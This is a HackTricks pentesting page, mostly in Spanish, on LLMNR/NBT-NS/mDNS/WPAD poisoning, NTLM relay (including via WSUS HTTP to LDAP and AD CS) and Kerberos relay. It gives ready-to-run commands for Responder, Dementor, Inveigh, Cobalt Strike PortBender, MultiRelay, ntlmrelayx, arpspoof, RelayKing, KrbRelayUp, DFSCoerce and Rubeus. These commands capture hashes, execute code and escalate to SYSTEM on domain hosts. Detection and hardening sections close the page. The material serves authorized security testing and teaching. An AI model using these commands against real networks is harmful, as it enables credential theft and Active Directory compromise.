# Spoofing LLMNR, NBT-NS, mDNS/DNS y WPAD y Relay Attacks

{{#include ../../banners/hacktricks-training.md}}

## Network Protocols

### Local Host Resolution Protocols

- **LLMNR, NBT-NS, and mDNS**:
- Microsoft y otros sistemas operativos usan LLMNR y NBT-NS para la resolución de nombres local cuando DNS falla. De forma similar, los sistemas Apple y Linux usan mDNS.
- Estos protocolos son susceptibles a la interceptación y el spoofing debido a su naturaleza no autenticada y broadcast sobre UDP.
- [Responder](https://github.com/lgandx/Responder) y [Dementor](https://github.com/MatrixEditor/Dementor) pueden usarse para suplantar servicios enviando respuestas forjadas a hosts que consultan estos protocolos.
- Más información sobre la suplantación de servicios usando Responder puede encontrarse [aquí](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### Web Proxy Auto-Discovery Protocol (WPAD)

- WPAD permite a los navegadores descubrir automáticamente la configuración del proxy.
- El descubrimiento se facilita vía DHCP, DNS, o como fallback a LLMNR y NBT-NS si DNS falla.
- Responder puede automatizar ataques WPAD, dirigiendo a los clientes hacia servidores WPAD maliciosos.

### Responder/Dementor for Protocol Poisoning

- **Responder** es una herramienta usada para envenenar consultas LLMNR, NBT-NS y mDNS, respondiendo selectivamente según los tipos de consulta, apuntando principalmente a servicios SMB.
- Viene preinstalado en Kali Linux, configurable en `/etc/responder/Responder.conf`.
- Responder muestra hashes capturados en pantalla y los guarda en el directorio `/usr/share/responder/logs`.
- Soporta tanto IPv4 como IPv6.
- La versión para Windows de Responder está disponible [here](https://github.com/lgandx/Responder-Windows).

- **Dementor** amplía los temas de multicast poisoning y además actúa como un proveedor de servicios rogue (incluye soporte para CUPS RCE)
- La estructura general es similar a **Responder** con una configuración más granular. (el default está aquí: [Dementor.toml](https://github.com/MatrixEditor/dementor/blob/master/dementor/assets/Dementor.toml))
- La compatibilidad entre **Dementor** y **Responder** se muestra aquí: [Compatibility Matrix](https://matrixeditor.github.io/dementor/compat.html)
- Introducción y documentación aquí: [Dementor - Docs](https://matrixeditor.github.io/dementor/intro.html)
- Corrige problemas de captura introducidos por Responder en ciertos protocolos

#### Running Responder

- To run Responder with default settings: `responder -I <Interface>`
- For more aggressive probing (with potential side effects): `responder -I <Interface> -P -r -v`
- Techniques to capture NTLMv1 challenges/responses for easier cracking: `responder -I <Interface> --lm --disable-ess`
- WPAD impersonation can be activated with: `responder -I <Interface> --wpad`
- NetBIOS requests can be resolved to the attacker's IP, and an authentication proxy can be set up: `responder.py -I <interface> -Pv`

#### Running Dementor

- Con la configuración predeterminada aplicada: `Dementor -I <interface>`
- Con la configuración predeterminada en modo análisis: `Dementor -I <interface> -A`
- Downgrade automático de sesiones NTLM (ESS): `Dementor -I <interface> -O NTLM.ExtendedSessionSecurity=Off`
- Ejecutar la sesión actual con config personalizada: `Dementor -I <interface> --config <file.toml>`

### DHCP Poisoning with Responder

- Spoofear respuestas DHCP puede envenenar permanentemente la información de enrutamiento de una víctima, ofreciendo una alternativa más sigilosa al ARP poisoning.
- Requiere conocimiento preciso de la configuración de la red objetivo.
- Ejecutar el ataque: `./Responder.py -I eth0 -Pdv`
- Este método puede capturar efectivamente hashes NTLMv1/2, pero requiere manejo cuidadoso para evitar la interrupción de la red.

### Capturing Credentials with Responder/Dementor

- Responder/Dementor suplantarán servicios usando los protocolos mencionados, capturando credenciales (usualmente NTLMv2 Challenge/Response) cuando un usuario intenta autenticarse contra los servicios suplantados.
- Se pueden intentar downgrades a NetNTLMv1 o desactivar ESS para facilitar el cracking de credenciales.

If you already have a **writable SMB share that victims browse**, you can coerce outbound SMB without spoofing by planting UNC-based lure files (SCF/LNK/library-ms/desktop.ini/Office) generated with ntlm_theft, then catching the authentication with Responder. See the [Explorer-triggered UNC lure workflow](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md#writable-smb-share--explorer-triggered-unc-lures-ntlm_theftscflnklibrary-msdesktopini).

Es crucial señalar que el empleo de estas técnicas debe hacerse legal y éticamente, asegurando la autorización adecuada y evitando la interrupción o el acceso no autorizado.

## Inveigh

Inveigh es una herramienta para penetration testers y red teamers, diseñada para sistemas Windows. Ofrece funcionalidades similares a Responder, realizando spoofing y ataques man-in-the-middle. La herramienta ha evolucionado desde un script PowerShell a un binario C#, con [**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) y [**InveighZero**](https://github.com/Kevin-Robertson/InveighZero) como las versiones principales. Parámetros detallados e instrucciones pueden encontrarse en la [**wiki**](https://github.com/Kevin-Robertson/Inveigh/wiki/Parameters).

Inveigh puede ejecutarse a través de PowerShell:
```bash
Invoke-Inveigh -NBNS Y -ConsoleOutput Y -FileOutput Y
```
O ejecutado como un binario de C#:
```bash
Inveigh.exe
```
### NTLM Relay Attack

Este ataque aprovecha las sesiones de autenticación SMB para acceder a una máquina objetivo, otorgando un shell del sistema si tiene éxito. Los prerrequisitos clave incluyen:

- El usuario que se autentica debe tener acceso Local Admin en el host retransmitido.
- SMB signing debe estar deshabilitado.

#### 445 Port Forwarding and Tunneling

En escenarios donde la introducción directa en la red no es factible, el tráfico en el puerto 445 necesita ser reenviado y tunelizado. Herramientas como [**PortBender**](https://github.com/praetorian-inc/PortBender) ayudan a redirigir el tráfico del puerto 445 a otro puerto, lo cual es esencial cuando hay acceso Local Admin disponible para la carga de drivers.

PortBender setup and operation in Cobalt Strike:
```bash
Cobalt Strike -> Script Manager -> Load (Select PortBender.cna)

beacon> cd C:\Windows\system32\drivers # Navigate to drivers directory
beacon> upload C:\PortBender\WinDivert64.sys # Upload driver
beacon> PortBender redirect 445 8445 # Redirect traffic from port 445 to 8445
beacon> rportfwd 8445 127.0.0.1 445 # Route traffic from port 8445 to Team Server
beacon> socks 1080 # Establish a SOCKS proxy on port 1080

# Termination commands
beacon> jobs
beacon> jobkill 0
beacon> rportfwd stop 8445
beacon> socks stop
```
### Otras herramientas para NTLM Relay Attack

- **Metasploit**: Configurarlo con proxies y los detalles del host local y remoto.
- **smbrelayx**: Un script en Python para relay de sesiones SMB y para ejecutar comandos o desplegar backdoors.
- **MultiRelay**: Una herramienta del suite Responder para relay de usuarios específicos o de todos los usuarios, ejecutar comandos o dump hashes.

Cada herramienta puede configurarse para operar a través de un SOCKS proxy si es necesario, permitiendo ataques incluso con acceso indirecto a la red.

### Operación de MultiRelay

MultiRelay se ejecuta desde el directorio _**/usr/share/responder/tools**_, apuntando a IPs específicas o a usuarios.
```bash
python MultiRelay.py -t <IP target> -u ALL # Relay all users
python MultiRelay.py -t <IP target> -u ALL -c whoami # Execute command
python MultiRelay.py -t <IP target> -u ALL -d # Dump hashes

# Proxychains for routing traffic
```
### RelayKing – descubrimiento de objetivos relayable y listas de relay curadas

RelayKing es un NTLM relay **auditor de exposición** que mapea dónde los relays son viables y produce listas de objetivos listas para usar para `ntlmrelayx.py -tf`. Verifica el hardening de protocolos (SMB signing/channel binding; HTTP/HTTPS/MSSQL/LDAP/LDAPS EPA/CBT; RPC auth) e identifica **mecanismos de coerción/reflexión** (PetitPotam/PrinterBug/DFSCoerce, WebClient/WebDAV, NTLMv1, CVE-2025-33073 reflection).

- La autenticación mejora la fiabilidad de las comprobaciones HTTPS/LDAPS CBT y MSSQL EPA; el nivel de firma/signature de SMB se prueba sin autenticación.
- El enrutamiento cross-protocol de relay aprovecha hallazgos confirmados de Net-NTLMv1 (`--ntlmv1`/`--ntlmv1-all`); se proporciona una clasificación de severidad por ruta.
- `--gen-relay-list <file>` escribe una lista de objetivos compatible con grep para `ntlmrelayx.py -tf <file>` para evitar prueba y error.
- `--coerce-all` desencadena masivamente PetitPotam/DFSCoerce/PrinterBug contra todos los objetivos; `--ntlmv1-all` (RemoteRegistry) y `--audit` (extracción de hosts LDAP a nivel de dominio) son **noisy** y generan muchos logons/accesos remotos.
- `--proto-portscan` acelera el escaneo omitiendo puertos cerrados; `--krb-dc-only` ayuda cuando los DCs bloquean NTLM pero otros servicios aún lo aceptan.

Ejemplos de barridos:
```bash
# Authenticated audit across multiple protocols + generate relay list for ntlmrelayx
python3 relayking.py -u lowpriv -p 'P@ssw0rd!' -d lab.local --dc-ip 10.0.0.10 \
--audit --protocols smb,ldap,ldaps,mssql,http,https --proto-portscan --ntlmv1 \
--threads 10 -vv -o plaintext,json --output-file relayking-scan --gen-relay-list relaytargets.txt

# Unauthenticated CIDR sweep for SMB/LDAP/HTTP relayability
python3 relayking.py --null-auth --protocols smb,ldap,http --proto-portscan -o plaintext 10.10.0.0/24
```
Estas herramientas y técnicas forman un conjunto completo para llevar a cabo ataques NTLM Relay en diversos entornos de red.

### Abusar de WSUS HTTP (8530) para NTLM Relay hacia LDAP/SMB/AD CS (ESC8)

Los clientes WSUS se autentican ante su servidor de actualizaciones usando NTLM sobre HTTP (8530) o HTTPS (8531). Cuando HTTP está habilitado, los check-ins periódicos de los clientes pueden ser forzados o interceptados en el segmento local y relayed con ntlmrelayx a endpoints LDAP/LDAPS/SMB o AD CS HTTP (ESC8) sin crackear hashes. Esto se mezcla con el tráfico normal de actualizaciones y con frecuencia devuelve autenticaciones de cuentas de máquina (HOST$).

Qué buscar
- Configuración de GPO/registro en HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate y ...\WindowsUpdate\AU:
- WUServer (p. ej., http://wsus.domain.local:8530)
- WUStatusServer (URL de reporte)
- UseWUServer (1 = WSUS; 0 = Microsoft Update)
- DetectionFrequencyEnabled y DetectionFrequency (horas)
- Endpoints SOAP de WSUS usados por clientes sobre HTTP:
- /ClientWebService/client.asmx (approvals)
- /ReportingWebService/reportingwebservice.asmx (status)
- Puertos por defecto: 8530/tcp HTTP, 8531/tcp HTTPS

Reconocimiento
- No autenticado
- Escanear listeners: nmap -sSVC -Pn --open -p 8530,8531 -iL <hosts>
- Sniffear tráfico HTTP WSUS vía L2 MITM y registrar clientes/endpoints activos con wsusniff.py (HTTP solo a menos que consigas que los clientes confíen en tu TLS cert).
- Autenticado
- Analizar SYSVOL GPOs para claves WSUS con MANSPIDER + regpol (wsuspider.sh wrapper resume WUServer/WUStatusServer/UseWUServer).
- Consultar endpoints a escala desde hosts (NetExec) o localmente:
nxc smb <ip> -u <user> -p <pass> -M reg-query -o PATH="HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate" KEY="WUServer"
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate

Pasos de relay HTTP de extremo a extremo
1) Posiciónate para MITM (mismo L2) para que un cliente resuelva el servidor WSUS hacia ti (ARP/DNS poisoning, Bettercap, mitm6, etc.). Ejemplo con arpspoof:
arpspoof -i <iface> -t <wsus_client_ip> <wsus_server_ip>

2) Redirige el puerto 8530 a tu listener de relay (opcional, conveniente):
iptables -t nat -A PREROUTING -p tcp --dport 8530 -j REDIRECT --to-ports 8530
iptables -t nat -L PREROUTING --line-numbers

3) Inicia ntlmrelayx con el listener HTTP (requiere soporte de Impacket para HTTP listener; ver PRs abajo):
ntlmrelayx.py -t ldap://<DC> -smb2support -socks --keep-relaying --http-port 8530

Otros objetivos comunes:
- Relay hacia SMB (si signing off) para exec/dump: -t smb://<host>
- Relay hacia LDAPS para cambios en el directorio (p. ej., RBCD): -t ldaps://<DC>
- Relay hacia el enrollment web de AD CS (ESC8) para emitir un certificado y luego autenticarse vía Schannel/PKINIT:
ntlmrelayx.py --http-port 8530 -t http://<CA>/certsrv/certfnsh.asp --adcs --no-http-server
Para rutas de abuso más profundas de AD CS y tooling, ver la página de AD CS:

{{#ref}}
../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md
{{#endref}}

4) Forza un check-in del cliente o espera la programación. Desde un cliente:
wuauclt.exe /detectnow
o usa la UI de Windows Update (Check for updates).

5) Usa las sesiones SOCKS autenticadas (si -socks) o los resultados directos del relay para post-exploitation (cambios LDAP, operaciones SMB, o emisión de certificados AD CS para autenticación posterior).

Restricción HTTPS (8531)
- La intercepción pasiva de WSUS sobre HTTPS es inefectiva a menos que los clientes confíen en tu certificado. Sin un cert de confianza u otra ruptura de TLS, el NTLM handshake no puede ser cosechado/relayed desde el tráfico WSUS HTTPS.

Notas
- WSUS fue marcado como deprecated pero sigue ampliamente desplegado; HTTP (8530) sigue siendo común en muchos entornos.
- Herramientas útiles: wsusniff.py (observar check-ins WSUS HTTP), wsuspider.sh (enumerar WUServer/WUStatusServer desde GPOs), NetExec reg-query a escala.
- Impacket restauró soporte de listener HTTP para ntlmrelayx en PR #2034 (originalmente añadido en PR #913).

### Forzar inicios de sesión NTLM

En Windows **puede que puedas forzar que algunas cuentas privilegiadas se autentiquen en máquinas arbitrarias**. Lee la siguiente página para aprender cómo:


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}

## Ataque Kerberos Relay

Un **Kerberos relay attack** roba un **AP-REQ ticket** de un servicio y lo reutiliza contra un segundo servicio que comparte la **misma clave de cuenta de equipo** (porque ambos SPN están en la misma cuenta de máquina `$`). Esto funciona aunque las **clases de servicio** de los SPN difieran (p. ej. `CIFS/` → `LDAP/`) porque la clave que descifra el ticket es el NT hash de la máquina, no la cadena SPN en sí, y la cadena SPN no forma parte de la firma.

A diferencia del NTLM relay, el salto está limitado al *mismo host* pero, si apuntas a un protocolo que te permite escribir en LDAP, puedes encadenar hacia **Resource-Based Constrained Delegation (RBCD)** o **AD CS enrollment** y obtener **NT AUTHORITY\SYSTEM** en un solo golpe.

Para información detallada sobre este ataque consulta:

- [https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html](https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html)
- [https://decoder.cloud/2025/04/24/from-ntlm-relay-to-kerberos-relay-everything-you-need-to-know/](https://decoder.cloud/2025/04/24/from-ntlm-relay-to-kerberos-relay-everything-you-need-to-know/)

- 1. **Conceptos básicos de Kerberos**

| Token | Propósito | Relevancia para relay |
|-------|---------|-----------------|
| **TGT / AS-REQ ↔ REP** | Prueba la identidad del usuario ante el KDC | sin cambios |
| **Service ticket / TGS-REQ ↔ REP** | Vinculado a un solo **SPN**; cifrado con la clave del propietario del SPN | intercambiable si los SPN comparten cuenta |
| **AP-REQ** | El cliente envía el `TGS` al servicio | **lo que robamos y reproducimos** |

* Los tickets están cifrados con la **clave derivada de la contraseña de la cuenta que posee el SPN**.
* El **Authenticator** dentro del AP-REQ tiene una marca de tiempo de 5 minutos; la reproducción dentro de esa ventana es válida hasta que la caché del servicio vea un duplicado.
* Windows raramente comprueba si la cadena SPN en el ticket coincide con el servicio al que accedes, así que un ticket para `CIFS/HOST` normalmente se descifra bien en `LDAP/HOST`.

- 2. **Qué debe cumplirse para relayar Kerberos**

1. **Clave compartida:** los SPN de origen y destino pertenecen a la misma cuenta de equipo (por defecto en servidores Windows).
2. **Sin protección de canal:** SMB/LDAP signing desactivado y EPA desactivado para HTTP/LDAPS.
3. **Puedes interceptar o forzar la autenticación:** LLMNR/NBNS poison, DNS spoof, **PetitPotam / DFSCoerce RPC**, fake AuthIP, rogue DCOM, etc.
4. **Origen del ticket no usado ya:** ganas la carrera antes de que llegue el paquete real o lo bloqueas por completo; de lo contrario la caché de replays del servidor registra el Event 4649.
5. Necesitas poder realizar de algún modo un **MitM en la comunicación** — por ejemplo formar parte del grupo DNSAdmins para modificar el DNS del dominio o poder cambiar el archivo HOSTS de la víctima.

### Pasos del Kerberos Relay

- 3.1 **Reconocimiento del host**
```powershell
# find servers where HTTP, LDAP or CIFS share the same machine account
Get-ADComputer -Filter * -Properties servicePrincipalName |
Where-Object {$_.servicePrincipalName -match '(HTTP|LDAP|CIFS)'} |
Select Name,servicePrincipalName
```
- 3.2 **Iniciar el relay listener**

[KrbRelayUp](https://github.com/Dec0ne/KrbRelayUp)
```powershell
# one-click local SYSTEM via RBCD
.\KrbRelayUp.exe relay --spn "ldap/DC01.lab.local" --method rbcd --clsid 90f18417-f0f1-484e-9d3c-59dceee5dbd8
```
`KrbRelayUp` envuelve **KrbRelay → LDAP → RBCD → Rubeus → SCM bypass** en un solo binario.

- 3.3 **Coerce Kerberos auth**
```powershell
# coerce DC to auth over SMB with DFSCoerce
.\dfscoerce.exe --target \\DC01.lab.local --listener 10.0.0.50
```
DFSCoerce hace que el DC envíe un ticket Kerberos `CIFS/DC01` a nosotros.

- 3.4 **Reenviar el AP-REQ**

KrbRelay extrae el GSS blob de SMB, lo reempaqueta en un LDAP bind y lo reenvía a `ldap://DC01`—la autenticación tiene éxito porque la **misma clave** lo descifra.

- 3.5 **Abusar de LDAP ➜ RBCD ➜ SYSTEM**
```powershell
# (auto inside KrbRelayUp) manual for clarity
New-MachineAccount -Name "FAKE01" -Password "P@ss123"
KrbRelay.exe -spn ldap/DC01 -rbcd FAKE01_SID
Rubeus s4u /user:FAKE01$ /rc4:<hash> /impersonateuser:administrator /msdsspn:HOST/DC01 /ptt
SCMUACBypass.exe
```
Ahora posees **NT AUTHORITY\SYSTEM**.


### **Más rutas que vale la pena conocer**

| Vector | Trick | Why it matters |
|--------|-------|----------------|
| **AuthIP / IPSec** | Un servidor falso envía una **GSS-ID payload** con cualquier SPN; el cliente construye un AP-REQ directamente hacia ti | Funciona incluso entre subredes; machine creds por defecto |
| **DCOM / MSRPC** | Un OXID resolver malicioso fuerza al cliente a auth a un SPN y puerto arbitrarios | Pure *local* priv-esc; evita el firewall |
| **AD CS Web Enroll** | Reléa el ticket de máquina a `HTTP/CA` y consigue un cert, luego **PKINIT** para generar TGTs | Bypasses LDAP signing defenses |
| **Shadow Credentials** | Escribe `msDS-KeyCredentialLink`, luego PKINIT con un par de claves forjado | No es necesario añadir una cuenta de equipo |

### **Solución de problemas**

| Error | Meaning | Fix |
|-------|---------|-----|
| `KRB_AP_ERR_MODIFIED` | Ticket key ≠ target key | Host/SPN incorrecto |
| `KRB_AP_ERR_SKEW` | Clock > 5 min offset | Sincroniza la hora o usa `w32tm` |
| LDAP bind fails | Signing enforced | Usa la ruta AD CS o desactiva el signing |
| Event 4649 spam | Service saw duplicate Authenticator | bloquear o competir con el paquete original |


### **Detección**

* Aumento en **Event 4769** para `CIFS/`, `HTTP/`, `LDAP/` desde la misma fuente en segundos.
* **Event 4649** en el servicio indica que se detectó un replay.
* Un logon Kerberos desde **127.0.0.1** (relay al SCM local) es altamente sospechoso—mapea mediante una regla Sigma en los docs de KrbRelayUp.
* Vigila cambios en los atributos `msDS-AllowedToActOnBehalfOfOtherIdentity` o `msDS-KeyCredentialLink`.

## **Endurecimiento**

1. **Forzar LDAP & SMB signing + EPA** en cada servidor.
2. **Split SPNs** para que HTTP no esté en la misma cuenta que CIFS/LDAP.
3. Parchea los vectores de coerción (PetitPotam KB5005413, DFS, AuthIP).
4. Establece **`ms-DS-MachineAccountQuota = 0`** para detener uniones de equipos no autorizadas.
5. Genera alertas por **Event 4649** y logons Kerberos de loopback inesperados.



## Referencias

- [HTB: Breach – Writable SMB share lures + Responder capture → NetNTLMv2 crack](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [https://intrinium.com/smb-relay-attack-tutorial/](https://intrinium.com/smb-relay-attack-tutorial/)
- [https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/](https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/)
- [https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/](https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/)
- [https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html](https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html)
- [WSUS Is SUS: NTLM Relay Attacks in Plain Sight (TrustedSec)](https://trustedsec.com/blog/wsus-is-sus-ntlm-relay-attacks-in-plain-sight)
- [GoSecure – Abusing WSUS to enable NTLM relaying attacks](https://gosecure.ai/blog/2021/11/22/gosecure-investigates-abusing-windows-server-update-services-wsus-to-enable-ntlm-relaying-attacks)
- [Impacket PR #2034 – Restore HTTP server in ntlmrelayx](https://github.com/fortra/impacket/pull/2034)
- [Impacket PR #913 – HTTP relay support](https://github.com/fortra/impacket/pull/913)
- [WSUScripts – wsusniff.py](https://github.com/Coontzy1/WSUScripts/blob/main/wsusniff.py)
- [WSUScripts – wsuspider.sh](https://github.com/Coontzy1/WSUScripts/blob/main/wsuspider.sh)
- [MS-WSUSOD – Windows Server Update Services: Server-to-Client Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-wsusod/e00a5e81-c600-40d9-96b5-9cab78364416)
- [Microsoft – WSUS deprecation announcement](https://techcommunity.microsoft.com/blog/windows-itpro-blog/windows-server-update-services-wsus-deprecation/4250436)
- [RelayKing v1.0](https://github.com/depthsecurity/RelayKing-Depth)
- [Depth Security – Introducing RelayKing: Relay to Royalty](https://www.depthsecurity.com/blog/introducing-relayking-relay-to-royalty/)

{{#include ../../banners/hacktricks-training.md}}
